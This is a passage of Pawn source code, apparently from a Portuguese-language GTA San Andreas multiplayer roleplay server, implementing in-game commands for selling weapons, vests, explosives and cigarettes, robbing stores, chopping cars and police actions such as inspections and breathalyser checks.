				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}
				
				if(!IsPlayerAdmin(playerid) && plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender armas para si mesmo.");
				    return 1;
				}
				
				GetPlayerPos(playerid, PX, PY, PZ);
				GetPlayerPos(plid, X, Y, Z);

				if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      				return 1;
				}
		
				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    new weapons[128];
					new nweapons;
					
					SendClientMessage(playerid, COLOUR_GRAY, "USO: /arma vender [id] [arma] [cartuchos] - ARMAS DISPONÍVEIS:");
				    
				    for(new w = 1; w < sizeof Weapons; w++)
				    {
						if(!IsForbiddenWeapon(w))
						{
						    nweapons++;
						    format(weapons, sizeof weapons, "%s, %s", weapons, Weapons[w][wName]);
						    
						    
						    if(nweapons >= 7)
						    {
						        SendClientMessage(playerid, COLOUR_GRAY, weapons);
						        nweapons = 0;
						        weapons[0] = '\0';
						    }
						}
				    }
				    
				    if(nweapons > 0)
				    	SendClientMessage(playerid, COLOUR_GRAY, weapons);
				    	
				    return 1;
				}
				
				if(IsNumeric(tmp))
					weaponid = strval(tmp);
				
				else for(new w = 1; w < sizeof Weapons; w++)
				{
				    if(strcmp(tmp, Weapons[w][wName], true) == 0)
				    {
				        weaponid = w;
				        break;
				    }
				}
				
				if(weaponid < 1 || IsForbiddenWeapon(weaponid) || weaponid > 46)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Arma inválida.");
				    return 1;
				}
				
				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /arma vender [id] [arma] [cartuchos]");
				    return 1;
				}
				
				catridges = strval(tmp);
				
				if(catridges < 1 || catridges > Weapons[weaponid][wAmmoLimit] / Weapons[weaponid][wAmmo])
				{
				    new errmsg[128];
				    format(errmsg, sizeof errmsg, "Cartuchos de 1 à %d.", Weapons[weaponid][wAmmoLimit] / Weapons[weaponid][wAmmo]);
				    SendClientMessage(playerid, COLOUR_GRAY, errmsg);
				    return 1;
				}
				
				res = GivePlayerSysWeapon(plid, weaponid, Weapons[weaponid][wAmmo] * catridges);

				if(res == 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Essa arma já possui o número máximo de cartuchos.");
				    return 1;
				}

				if(res == 2)
				{
			    	SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma pesada.");
				    return 1;
				}

				if(res == 3)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma leve.");
				    return 1;
				}

				if(res == 4)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já possui uma arma branca.");
				    return 1;
				}
				
				WeaponMaterial[playerid]--;
				SendClientMessage(playerid, COLOUR_ARM_DEALER, "Arma vendida, peça para o jogador usar /pagar");
				format(string, sizeof string, "Modelo da Arma: %s <> Cartuchos: %d/%d (%d munições) <> Preço avaliado em: $%d,00 dólares.", Weapons[weaponid][wName], catridges, Weapons[weaponid][wAmmoLimit] / Weapons[weaponid][wAmmo], Weapons[weaponid][wAmmo] * catridges, Weapons[weaponid][wValue] * catridges);
				SendClientMessage(playerid, COLOUR_ARM_DEALER, string);
				format(string, sizeof string, "%s lhe vendeu um(a) %s com %d cartuchos (%d munições).", PlayerName(playerid), Weapons[weaponid][wName], catridges, Weapons[weaponid][wAmmo] * catridges);
				SendClientMessage(plid, COLOUR_WHITE, string);
	            return 1;
	        }
	        
			if(strcmp(weapon_cmd, "pegar", true) == 0)
			{
				if(GetPlayerInt(playerid) != INT_GUN_SHOP)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Ammu-Nation.");
				    return 1;
				}
				
			    if(WeaponMaterial[playerid] & 0xFF >= 3)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você pode pegar no máximo 3 armas.");
	                return 1;
			    }
			    
			    WeaponMaterial[playerid] = (WeaponMaterial[playerid] & 0xFFFF00) | 3;
			    SendClientMessage(playerid, COLOUR_ARM_DEALER, "Armas pegas, você agora tem 3 armas para vender.");
			    return 1;
			}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /arma [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "vender, pegar");
	    return 1;
	}
	
	if(strcmp(cmd, "/colete", true) == 0)
	{
	    new armour_cmd[128];

	    armour_cmd = strtok(cmdtext, idx);

	    if(strlen(armour_cmd) > 0)
	    {
	        if(strcmp(armour_cmd, "vender", true) == 0)
	        {
	            new tmp[128], string[128];
	            new plid;
	            new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	            
	            if(WeaponMaterial[playerid] & 0xFF00 <= 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não tem coletes, vá pegá-los na Ammu Nation.");
	                return 1;
	            }

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /colete vender [id]");
				    return 1;
				}

				plid = strval(tmp);

				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}

				if(!IsPlayerAdmin(playerid) && plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender colete para si mesmo.");
				    return 1;
				}

				GetPlayerPos(playerid, PX, PY, PZ);
				GetPlayerPos(plid, X, Y, Z);

				if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      				return 1;
				}
				
				WeaponMaterial[playerid] = (WeaponMaterial[playerid] & 0xFF00FF) | ((WeaponMaterial[playerid] - (1 << 8)) & 0xFF00);
				SetPlayerArmour(plid, 100.0);
				SendClientMessage(playerid, COLOUR_ARM_DEALER, "Colete vendido, peça para o jogador usar /pagar");
				format(string, sizeof string, "%s lhe vendeu um colete.", PlayerName(playerid));
				SendClientMessage(plid, COLOUR_WHITE, string);
	            return 1;
	        }
	        
	        if(strcmp(armour_cmd, "pegar", true) == 0)
	        {
	            if(GetPlayerInt(playerid) != INT_GUN_SHOP)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Ammu-Nation.");
				    return 1;
				}

			    if((WeaponMaterial[playerid] >> 8) & 0xFF >= 2)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você pode pegar no máximo 2 coletes.");
	                return 1;
			    }

			    WeaponMaterial[playerid] = (WeaponMaterial[playerid] & 0xFF00FF) | (2 << 8);
			    SendClientMessage(playerid, COLOUR_ARM_DEALER, "Coletes pegos, você agora tem 2 coletes para vender.");
	            return 1;
	        }
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /colete [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "vender, pegar");
		return 1;
	}
	
	if(strcmp(cmd, "/explosivo", true) == 0)
	{
	    new explosive_cmd[128];

	    explosive_cmd = strtok(cmdtext, idx);

	    if(strlen(explosive_cmd) > 0)
	    {
	        if(strcmp(explosive_cmd, "vender", true) == 0)
	        {
	            new tmp[128], string[128];
	            new plid, explosiveid, amount, amnt;
	            new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

	            if(WeaponMaterial[playerid] & 0xFF0000 <= 0)
	            {
	                SendClientMessage(playerid, COLOUR_GRAY, "Você não tem explosivos, vá pegá-los na Ammu Nation.");
	                return 1;
	            }

				tmp = strtok(cmdtext, idx);

				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /explosivo vender [id] [explosivo] [quantidade]");
				    return 1;
				}

				plid = strval(tmp);

				if(!IsPlayerConnected(plid))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
				    return 1;
				}

				if(!IsPlayerAdmin(playerid) && plid == playerid)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender explosivos para si mesmo.");
				    return 1;
				}

				GetPlayerPos(playerid, PX, PY, PZ);
				GetPlayerPos(plid, X, Y, Z);

				if(GetDistance(PX, PY, PZ, X, Y, Z) > NAME_TAG_DRAW_DISTANCE)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
      				return 1;
				}
				
				tmp = strtok(cmdtext, idx);
				explosiveid = -1;
				
				if(strlen(tmp) > 0)
				{
				    if(strcmp(tmp, "bomba-relogio", true) == 0)
				        explosiveid = 0;
				        
					else if(strcmp(tmp, "bomba-aprox", true) == 0)
				        explosiveid = 1;
				        
                    else if(strcmp(tmp, "bomba-remota", true) == 0)
				        explosiveid = 2;
				        
                    else if(strcmp(tmp, "bomba-gas", true) == 0)
				        explosiveid = 3;
				        
                    else if(strcmp(tmp, "flash", true) == 0)
				        explosiveid = 4;
				        
                    else if(strcmp(tmp, "rojao", true) == 0)
				        explosiveid = 5;
				}
				
				if(explosiveid == -1)
				{
					SendClientMessage(playerid, COLOUR_GRAY, "USO: /explosivo vender [id] [explosivo] [quantidade] - EXPLOSIVOS DISPONÍVEIS:");
					SendClientMessage(playerid, COLOUR_GRAY, "bomba-relogio, bomba-aprox, bomba-remota, bomba-gas, flash, rojao");
					return 1;
				}
				
				tmp = strtok(cmdtext, idx);
				
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "USO: /explosivo vender [id] [explosivo] [quantidade]");
				    return 1;
				}
				
				amount = strval(tmp);
				
				if(amount < 1)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Quantidade acima de 0.");
				    return 1;
				}
				
				if(amount > (WeaponMaterial[playerid] >> 16) & 0xFF)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não tem essa quantidade de explosivos.");
				    return 1;
				}
				
				for(new a = 0; a < amount; a++)
				{
				    if(GivePlayerExplosive(plid, explosiveid) != 0)
				        break;
				        
					amnt++;
				}
				
				if(amnt <= 0)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Esse jogador já possui a quantidade máxima desses explosivos.");
				    return 1;
				}
				
				WeaponMaterial[playerid] = (WeaponMaterial[playerid] & 0xFFFF) | ((WeaponMaterial[playerid] - (amnt << 16)) & 0xFF0000);
                SendClientMessage(playerid, COLOUR_ARM_DEALER, "Explosivos vendidos, peça para o jogador usar /pagar");
                format(string, sizeof string, "Explosivo: %s <> Quantidade: %d <> Preço avaliado em: $%d,00 dólares.", Explosives[explosiveid][expName], amnt, Explosives[explosiveid][expValue] * amnt);
				SendClientMessage(playerid, COLOUR_ARM_DEALER, string);
				format(string, sizeof string, "%s lhe vendeu %d quantidade(s) de %s.", PlayerName(playerid), amnt, Explosives[explosiveid][expName]);
				SendClientMessage(plid, COLOUR_WHITE, string);
				return 1;
	        }
	        
	        if(strcmp(explosive_cmd, "pegar", true) == 0)
	        {
	            if(GetPlayerInt(playerid) != INT_GUN_SHOP)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Ammu-Nation.");
				    return 1;
				}

			    if((WeaponMaterial[playerid] >> 16) & 0xFF >= 4)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Você pode pegar no máximo 4 explosivos.");
	                return 1;
			    }

			    WeaponMaterial[playerid] = (WeaponMaterial[playerid] & 0xFFFF) | (4 << 16);
			    SendClientMessage(playerid, COLOUR_ARM_DEALER, "Explosivos pegos, você agora tem 4 explosivos para vender.");
	            return 1;
	        }
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "USO: /explosivo [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "vender, pegar");
		return 1;
	}
	
	// Vendedor de Armas - Fim
	
	// Traficante - Inicio

	if(strcmp(cmd, "/cigarro", true) == 0)
	{
	    new ccmd[128];
	    
	    ccmd = strtok(cmdtext, idx);
	    
	    if(strlen(ccmd) > 0)
	    {
			if(strcmp(ccmd, "pegar", true) == 0)
			{
	        	if(Company[playerid] != COMPANY_CRACK)
	        	{
	                SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar no laboratório de drogas.");
	                return 1;
	        	}
	        	
	        	if(Cigarrete[playerid] >= 5)
	        	{
	        	    SendClientMessage(playerid, COLOUR_GRAY, "Você já está carregando o máximo de cigarros.");
	                return 1;
	        	}
	        	
	        	Cigarrete[playerid] = 5;
	        	SendClientMessage(playerid, COLOUR_DRUG_DEALER, "Agora você possui 5 papelotes de cigarro.");
	        	return 1;
			}
			
			if(strcmp(ccmd, "vender", true) == 0)
			{
			    new tmp[128], string[128];
			    new plid;
			    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
			    
			    tmp = strtok(cmdtext, idx);

	    		if(!strlen(tmp))
	    		{
	    		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /cigarro vender [id]");
			        return 1;
			    }

			    plid = strval(tmp);

	    		if(!IsPlayerConnected(plid))
  				{
	        		SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	    		    return 1;
	    		}
	    
	            GetPlayerPos(playerid, X, Y, Z);
				GetPlayerPos(plid, PX, PY, PZ);

				if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
	        		return 1;
				}
		
		        if(Cigarrete[playerid] <= 0)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Você não possui cigarros para vender.");
	        		return 1;
		        }

                if(!IsPlayerAdmin(playerid) && plid == playerid)
				{
		    		SendClientMessage(playerid, COLOUR_GRAY, "Você não pode vender um cigarro para si mesmo.");
	        		return 1;
				}
		
		        if(GetPlayerSpecialAction(plid) == SPECIAL_ACTION_SMOKE_CIGGY)
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já está com um cigarro.");
	        		return 1;
		        }
		        
		        if(IsPlayerInAnyVehicle(plid))
		        {
		            SendClientMessage(playerid, COLOUR_GRAY, "O jogador não pode estar em um veículo.");
	        		return 1;
		        }
		        
		        Cigar[plid] = 5;
		        Cigarrete[playerid]--;
		        SetPlayerSpecialAction(plid, SPECIAL_ACTION_SMOKE_CIGGY);
		        SendClientMessage(playerid, COLOUR_DRUG_DEALER, "Cigarro vendido, peça para o jogador usar /pagar");
		        format(string, sizeof string, "%s lhe vendeu um cigarro, para pagá-lo use /pagar", PlayerName(playerid));
		        SendClientMessage(plid, COLOUR_WHITE, string);
		        format(string, sizeof string, "Para fumar pressione ~y~%s", GetKeyName(K_SMOKE, 1));
		    	DrawTextForPlayer(plid, string, COLOUR_WHITE, TEXTDRAW_STYLE_2, 3000);
		        return 1;
			}
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "USO: /cigarro [comando] - COMANDOS DISPONÍVEIS:");
	    SendClientMessage(playerid, COLOUR_GRAY, "pegar, vender");
	    return 1;
	}

	if(strcmp(cmd, "/assaltar", true) == 0)
	{
	    new string[128];
		new safe, point, rand;
		new Text:tdrob;
		
		safe = GetPlayerSafe(playerid);
		point = GetSafePoint(safe);
		
		if(safe == -1 || point == -1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um local que pode ser assaltado.");
		    return 1;
		}
		
		if(Rob[playerid] != 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você já está assaltando.");
		    return 1;
		}
		
		for(new n = 0; n < MAX_SLOTS; n++)
		{
			if(IsPlayerConnected(n) && IsPlayerLogged(n) && n != playerid)
			{
			    if((Rob[n] >> 24) & 0xFF == safe)
			    {
			        SendClientMessage(playerid, COLOUR_GRAY, "Já há alguém assaltando este local.");
		    		return 1;
			    }
			}
		}
		
		tdrob = TextDrawCreate(21.0, 125.0, TEXT("~b~Roubo: ~g~$~w~0,00 dólares"));
		TextDrawAlignment(tdrob, 0);
		TextDrawFont(tdrob, 1);
		TextDrawLetterSize(tdrob, 0.5, 1.5);
		TextDrawColour(tdrob, COLOUR_WHITE);
		TextDrawSetProportional(tdrob, 1);
		TextDrawSetShadow(tdrob, 1);
		
		Rob[playerid] = safe << 24;
		rand = random(2);
		
		if(rand == 0)
			Say(playerid, "ISSO É UM ASSALTO! MÃOS PARA O ALTO NEGADA...", 60.0);

		if(rand == 1)
		    Say(playerid, "O SHOW VAI COMEÇAR, TODO MUNDO PRO CHÃO!", 60.0);
		    
        SendClientMessage(playerid, COLOUR_DRUG_DEALER, "Assalto iniciado... Peça cobertura ou poderá ser interrompido.");
 		format(string, sizeof string, "EMERGÊNCIA! Alarme contra assaltos no(a) %s em %s disparado, averigue a situação.", Safes[safe][sName], Safes[safe][sRef]);
        SendClientMessageToPolice(COLOUR_SWAT, string);
        ApplyAnimation(playerid, "PED", "ARRESTgun", 4.1, 0, 1, 1, 1, -1, 1);
        SolveTextBlack(playerid, 0);
        TextDrawShowForPlayer(playerid, tdrob);

		if(random(3) != 0)
		    format(string, sizeof string, "Principal Suspeito: %s", PlayerName(playerid));
		    
		else
		    format(string, sizeof string, "Principal Suspeito: Nenhum");
		    
        SendClientMessageToPolice(COLOUR_SWAT, string);
		SetTimerEx("Assaulting", 4000, false, "dd", playerid, _:tdrob);
	    return 1;
	}

	if(strcmp(cmd, "/desmanchar", true) == 0)
	{
	    new string[128];
	    new vehid;
	    
	    if(Area[playerid] != AREA_CHOP)
		{
    		SendClientMessage(playerid, COLOUR_GRAY, "Tu num tá na área mermão...");
    		return 1;
		}
		
		if(ChopValue <= 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "A gente num tá afim de lata nenhuma agora rapá...");
	        return 1;
	    }
	    
	    if(!IsPlayerInAnyVehicle(playerid))
     	{
            SendClientMessage(playerid, COLOUR_GRAY, "Maluco nem em carro tu tá...");
           	return 1;
     	}
     	
     	vehid = GetPlayerVehicleID(playerid);

		if(!IsPlayerVehicle(vehid))
     	{
            SendClientMessage(playerid, COLOUR_GRAY, "Nóis num tamo afim de carro de trabalho maluco...");
           	return 1;
     	}
            
		RemovePlayerFromVehicle(playerid);
		DestroyPlayerVehicle(vehid);
		GivePlayerSysMoney(playerid, ChopValue);
		SendClientMessageToJob(JOB_DRUG_DEALER, COLOUR_DRUG_DEALER, "[INFO] Só avisando, a gente num precisa de lata mais não.");
		format(string, sizeof string, "Vlw maluco, tu é responsa, toma aí umas verdinhas: $%d,00", ChopValue);
		SendClientMessage(playerid, COLOUR_DRUG_DEALER, string);
		ChopValue = 0;
	    return 1;
	}

	if(strcmp(cmd, "/desmanche", true) == 0)
	{
	    new string[128];

	    if(ChopValue <= 0)
	    {
	        SendClientMessage(playerid, COLOUR_DRUG_DEALER, "[INFO] A gente num tá afim de lata nenhuma agora rapá...");
	        return 1;
	    }

	    format(string, sizeof string, "[INFO] Nóis tamo pagando $%d,00 por qualqué lata.", ChopValue);
	    SendClientMessage(playerid, COLOUR_DRUG_DEALER, string);
	    return 1;
	}

    // Traficante - Fim
    
	// Policial - Inicio
	
	if(strcmp(cmd, "/arsenal", true) == 0)
	{
	    new Float:X, Float:Y, Float:Z;

	    GetPlayerPos(playerid, X, Y, Z);

		if(GetDistance(X, Y, Z, 255.3844, 77.1923, 1003.6406) > 10.0 || GetPlayerInterior(playerid) != 6)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar na sala de armamentos.");
		    return 1;
		}
		
		if(GetPlayerCounter(playerid, COUNTER_ARSENAL) > 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve esperar para pegar mais armamento.");
		    return 1;
		}
		
		if(pjob == JOB_POLICE)
		{
			GivePlayerSysWeapon(playerid, 3, 1);
			GivePlayerSysWeapon(playerid, 22, 60);
			GivePlayerSysWeapon(playerid, 25, 10);
		}
		
		else if(pjob == JOB_SWAT)
		{
		    GivePlayerSysWeapon(playerid, 3, 1);
		    
		    if(pWeapons[playerid][0] == 23)
		        GivePlayerSysWeapon(playerid, 23, 60);
		        
			else if(pWeapons[playerid][0] == 24)
			    GivePlayerSysWeapon(playerid, 24, 36);
			    
			else
			{
			    new rand;

			    rand = random(2);
			    
				if(rand == 0)
				    GivePlayerSysWeapon(playerid, 23, 60);
				    
				if(rand == 1)
				    GivePlayerSysWeapon(playerid, 24, 36);
			}
			
		    if(pWeapons[playerid][2] == 27)
		        GivePlayerSysWeapon(playerid, 27, 30);
		        
            else if(pWeapons[playerid][2] == 29)
		        GivePlayerSysWeapon(playerid, 29, 240);
		        
            else if(pWeapons[playerid][2] == 31)
		        GivePlayerSysWeapon(playerid, 31, 180);
		        
			else
			{
			    new rand;
			    
			    rand = random(3);
			    
			    if(rand == 0)
			        GivePlayerSysWeapon(playerid, 27, 30);
			        
			    if(rand == 1)
			        GivePlayerSysWeapon(playerid, 29, 240);
			        
			    if(rand == 2)
			        GivePlayerSysWeapon(playerid, 31, 180);
			}
		}
		
		else if(pjob == JOB_DELEGATE)
		{
		    GivePlayerSysWeapon(playerid, 3, 1);
		    GivePlayerSysWeapon(playerid, 24, 60);
		    GivePlayerSysWeapon(playerid, 31, 300);
		}
		
		else
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não é Policial, SWAT ou Delegado.");
		    return 1;
		}

        SetPlayerCounter(playerid, COUNTER_ARSENAL, 40);
        DrawTextForPlayer(playerid, "Armamento adquirido.", COLOUR_GREEN, TEXTDRAW_STYLE_2, 3000);
		return 1;
	}
	
	if(strcmp(cmd, "/policia", true) == 0)
	{
	    new string[128];
	    new jobid;
	    
	    for(new p = 0; p < 3; p++)
	    {
	        if(p == 0)
	            jobid = JOB_DELEGATE;
	            
			if(p == 1)
			    jobid = JOB_SWAT;
			    
			if(p == 2)
			    jobid = JOB_POLICE;
			    
			SendClientMessage(playerid, COLOUR_SWAT, "Lista de Policiais:");
			
	    	for(new n = 0; n < MAX_SLOTS; n++)
	    	{
	    	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    	    {
					if(hGetInt(GetPlayerXFilePath(n), "Job") == jobid)
					{
					    format(string, sizeof string, "Oficial %s - Cargo: %s", PlayerName(n), Jobs[jobid][jobName]);
					    SendClientMessage(playerid, COLOUR_WHITE, string);
					}
		        }
		    }
		}
		
		return 1;
	}
	
	if(strcmp(cmd, "/bafometro", true) == 0)
	{
	    new tmp[128], string[128];
		new plid;
		new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
		
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /bafometro [id]");
	        return 1;
		}
		
		plid = strval(tmp);
		
		if(!IsPlayerConnected(plid))
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			return 1;
		}
		
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerPos(plid, PX, PY, PZ);
		
		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
			return 1;
		}

		if(pDrunk[playerid] < 2200)
  			string = ("Zerado");

		else if(pDrunk[playerid] < 8000)
    		string = ("Baixo");

		else if(pDrunk[playerid] < 20000)
    		string = ("Médio");

		else if(pDrunk[playerid] < 40000)
    		string = ("Alto");

		else
    		string = ("Muito Alto");
				    
		if(pDrunk[playerid] < 8000)
			format(string, sizeof string, "Nível Alcóolico: %s - Consciente para dirigir.", string);
			
		else
		    format(string, sizeof string, "Nível Alcóolico: %s - Sem condições para dirigir.", string);
		    
		SendClientMessage(playerid, COLOUR_SWAT, string);
		return 1;
	}
	
	if(strcmp(cmd, "/fiscalizar", true) == 0)
	{
	    new xpath[128], object[128];
	    new plid;
	    new Float:X, Float:Y, Float:Z, Float:A, Float:PX, Float:PY, Float:PZ, Float:PA, Float:D;

        if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode fiscalizar um jogador.");
	        return 1;
	    }

	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode fiscalizar um jogador.");
	        return 1;
	    }
	    
	    object = strtok(cmdtext, idx);
	    
	    if(!strlen(object))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /fiscalizar [objeto] - OBJETOS DISPONÍVEIS:");
	        SendClientMessage(playerid, COLOUR_GRAY, "armas, drogas, celular, habilitacao, porte");
	        return 1;
	    }

	    GetPlayerPos(playerid, PX, PY, PZ);
	    GetPlayerFacingAngle(playerid, PA);
	    D = NAME_TAG_DRAW_DISTANCE;
	    plid = INVALID_PLAYER_ID;

	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n) && Dying[n] == 0 && n != playerid)
	        {
				new Float:dis, Float:fdis, Float:ang;

                for(new cop = 0; cop < MAX_SLOTS; cop++)
				{
	    			if(IsPlayerConnected(cop) && IsPlayerLogged(cop) && HoldId[cop] == n)
	        			continue;
				}

				GetPlayerPos(n, X, Y, Z);
				GetPlayerFacingAngle(n, A);
				dis = GetDistance(PX, PY, PZ, X, Y, Z);
				fdis = GetDistance(PX, PY, PZ, X + floatsin(-A, degrees), Y + floatcos(-A, degrees), Z);
				ang = mod(PA - A);

				if(dis < D && dis <= fdis && (ang < 210.0 || ang > 150.0))
				{
				    D = dis;
				    plid = n;
				}
	        }
	    }

		if(plid == INVALID_PLAYER_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar na frente de alguém para fiscalizá-lo.");
		    return 1;
		}

		xpath = GetPlayerXFilePath(plid);
		
		if(strcmp(object, "armas", true) == 0)
		{
		    ResetPlayerWeapons(plid);
		    
		    for(new w = 0; w < 5; w++)
		        pWeapons[plid][w] = 0;
		        
		    SendClientMessage(playerid, COLOUR_SWAT, "Armas fiscalizadas.");
			SendClientMessage(plid, COLOUR_WHITE, "O Oficial fiscalizou suas armas.");
			AddLevel(playerid);
		}
		
		else if(strcmp(object, "drogas", true) == 0)
		{
		    if(Cigar[plid] <= 0)
		    {
 	    		SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não possui drogas.");
 	    		return 1;
		    }
		    
            Cigar[plid] = 0;
            SendClientMessage(playerid, COLOUR_SWAT, "Drogas fiscalizadas.");
			SendClientMessage(plid, COLOUR_WHITE, "O Oficial fiscalizou suas drogas.");
			Pay(playerid, 100);
		}
		
		else if(strcmp(object, "celular", true) == 0)
		{
            if(GetPlayerPhone(plid) == 0)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não possui celular.");
		        return 1;
		    }

			RemovePlayerPhone(plid);
			SendClientMessage(playerid, COLOUR_SWAT, "Celular fiscalizado.");
			SendClientMessage(plid, COLOUR_WHITE, "O Oficial fiscalizou seu celular.");
			Pay(playerid, 50);
		}
		
		else if(strcmp(object, "habilitacao", true) == 0)
		{
		    new hab, habt, habn, haba;
		    
		    hab = hGetInt(xpath, "Hab");
	    	habt = (hab >> 2) & 0x1;
			habn = (hab >> 1) & 0x1;
			haba = hab & 0x1;
		
		    if(habt == 0)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não possui habilitação terrestre.");
		        return 1;
		    }
		    
            hSetInt(xpath, "Hab", ((habn & 0x1) << 1) | (haba & 0x1));
            SendClientMessage(playerid, COLOUR_SWAT, "Habilitação Terrestre fiscalizada.");
			SendClientMessage(plid, COLOUR_WHITE, "O Oficial fiscalizou sua habilitação terrestre.");
			Pay(playerid, 100);
		}
		
		else if(strcmp(object, "porte", true) == 0)
		{
		    if(hGetInt(xpath, "LicenseGun") == 0)
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não possui porte de armas.");
 	    		return 1;
		    }
		    
		    hSetInt(xpath, "LicenseGun", 0);
		    SendClientMessage(playerid, COLOUR_SWAT, "Porte fiscalizado.");
			SendClientMessage(plid, COLOUR_WHITE, "O Oficial fiscalizou seu porte de armas.");
			Pay(playerid, 100);
		}
	    
	    else
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /fiscalizar [objeto] - OBJETOS DISPONÍVEIS:");
	        SendClientMessage(playerid, COLOUR_GRAY, "armas, drogas, celular, habilitacao, porte");
	    }
	    
		return 1;
	}
	
	if(strcmp(cmd, "/revistar", true) == 0)
	{
	    new xpath[128], string[128];
	    new plid;
	    new Float:X, Float:Y, Float:Z, Float:A, Float:PX, Float:PY, Float:PZ, Float:PA, Float:D;

        if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode revistar um jogador.");
	        return 1;
	    }

	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode revistar um jogador.");
	        return 1;
	    }

	    GetPlayerPos(playerid, PX, PY, PZ);
	    GetPlayerFacingAngle(playerid, PA);
	    D = NAME_TAG_DRAW_DISTANCE;
	    plid = INVALID_PLAYER_ID;

	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n) && Dying[n] == 0 && n != playerid)
	        {
				new Float:dis, Float:fdis, Float:ang;

                for(new cop = 0; cop < MAX_SLOTS; cop++)
				{
	    			if(IsPlayerConnected(cop) && IsPlayerLogged(cop) && HoldId[cop] == n)
	        			continue;
				}

				GetPlayerPos(n, X, Y, Z);
				GetPlayerFacingAngle(n, A);
